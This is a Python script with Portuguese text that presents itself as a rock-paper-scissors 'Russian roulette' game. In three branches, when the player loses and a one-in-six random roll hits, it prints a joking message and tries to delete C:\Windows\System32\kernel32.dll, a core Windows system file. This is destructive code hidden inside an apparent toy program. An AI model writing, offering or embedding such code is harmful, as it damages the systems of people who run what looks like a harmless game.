import random
import argparse
import os

opponent_choice = ["pedra", "papel", "tesoura"]
shoot = random.randint(1, 6)
escolha = random.choice(opponent_choice)

parser = argparse.ArgumentParser(description="Você foi raptado e agora deve seguir as regras para sobreviver use --mao e escolha entre pedra papel ou tesoura.")

parser.add_argument("--mao", choices=["pedra", "papel", "tesoura"], default="nada")



args = parser.parse_args()

#caso pedra
def escolha_pedra():
	if args.mao == "pedra":
		if escolha == "papel":
			if shoot == 1:
					print("kernel protegido ainda bem, né? :)")
					os.remove("C:\\Windows\\System32\\kernel32.dll")
			else:
				print ("Você sobreviveu. :)")
		elif escolha == "tesoura":
			if shoot == 1:
					print("Você matou seu oponente!")
			else:
					print("Seu oponente sobreviveu. :(")
		elif escolha == "pedra":
				print ("Empate!!")
escolha_pedra()

#caso papel
def escolha_papel():
	if args.mao == "papel":
		if escolha == "pedra":
			if shoot == 1:
				print ("Você matou seu oponente!")
			else: 
				print ("Seu oponente sobreviveu. :(")

		elif escolha == "papel":
			print("Empate!!")

		elif escolha == "tesoura":
			if shoot == 1:
				print("Kernel protegido ainda bem né? :)")
				os.remove("C:\\Windows\\System32\\kernel32.dll")
			else:
				print ("Você sobreviveu. :)")
escolha_papel()


#caso tesoura
def escolha_tesoura():
	if args.mao == "tesoura":
		if escolha == "pedra":
			if shoot == 1:
				print("Kernel protegido ainda bem, né? :)")
				os.remove("C:\\Windows\\System32\\kernel32.dll")
			else:
				print ("Você sobreviveu. :)")
		elif escolha == "papel":
			if shoot == 1:
				print ("Você matou seu oponente!")
			else:
				print ("Seu oponente sobreviveu. :(")
		elif escolha == "tesoura":
			print ("Empate!!")
escolha_tesoura()